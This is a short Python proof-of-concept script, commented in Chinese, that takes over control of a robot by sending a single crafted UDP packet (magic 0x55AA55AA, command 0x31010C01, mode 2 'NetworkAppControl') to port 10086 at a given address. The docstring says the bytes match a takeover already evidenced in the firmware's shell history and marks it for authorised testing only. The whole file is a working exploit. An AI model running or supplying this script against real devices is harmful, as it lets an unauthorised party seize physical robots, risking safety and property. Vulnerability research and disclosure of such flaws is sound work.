#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""单包 PoC：接管机器人控制权（UDP 10086, cmd 0x31010C01, mode=2 NetworkApp）
与固件内 .bash_history 已实证的接管 PoC 字节一致。仅授权测试。"""
import socket, struct, sys

host = sys.argv[1] if len(sys.argv) > 1 else "192.168.2.1"
mode = int(sys.argv[2]) if len(sys.argv) > 2 else 2   # 2=GalileoNetworkAppControl
payload = struct.pack("<IIII", 0x55AA55AA, 0x31010C01, mode, 0)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(payload, (host, 10086))
print(f"[>] sent takeover to {host}:10086  mode={mode}  bytes={payload.hex()}")
